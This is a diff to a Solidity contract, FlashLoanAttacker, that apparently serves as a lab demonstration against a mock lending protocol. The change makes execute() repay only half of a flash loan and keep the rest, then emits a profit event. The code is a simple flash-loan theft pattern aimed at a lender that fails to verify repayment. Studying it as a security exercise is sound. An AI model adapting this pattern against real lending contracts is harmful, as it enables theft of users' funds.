@@ -2,12 +2,13 @@
 pragma solidity ^0.8.0;
 
 import "./MockLendingProtocol.sol";
+import "./IFlashLoanReceiver.sol";
 
-contract FlashLoanAttacker is FlashLoanReceiver {
+contract FlashLoanAttacker is IFlashLoanReceiver {
     address payable public owner;
     MockLendingProtocol public lender;
-
-    constructor(address _lender) {
+ event ProfitMade(uint256 amount);
+    constructor(address payable _lender) {
         owner = payable(msg.sender);
         lender = MockLendingProtocol(_lender);
     }
@@ -16,16 +17,22 @@ contract FlashLoanAttacker is FlashLoanReceiver {
         lender.provideFlashLoan(loanAmount, address(this));
     }
 
-    // Called by lender with ETH
-    function execute() public payable override {
-        // 🧨 Simulate exploit — e.g., manipulating DEX price or oracle
-        // For now, just send back loan (to avoid revert)
-        payable(address(lender)).transfer(msg.value);
+function execute() external payable override {
+    uint256 loanAmount = msg.value;
+    uint256 profit = loanAmount / 2;
 
-        // In a real exploit, the attacker might profit here
+    // Repay part of the loan
+    payable(address(lender)).transfer(loanAmount - profit);
+
+    // ✅ Emit event showing attacker kept ETH
+    emit ProfitMade(profit);
+}
+
+
+    function getAttackerBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 
-    // Withdraw any leftover ETH
     function withdraw() public {
         require(msg.sender == owner, "Only owner");
         owner.transfer(address(this).balance);
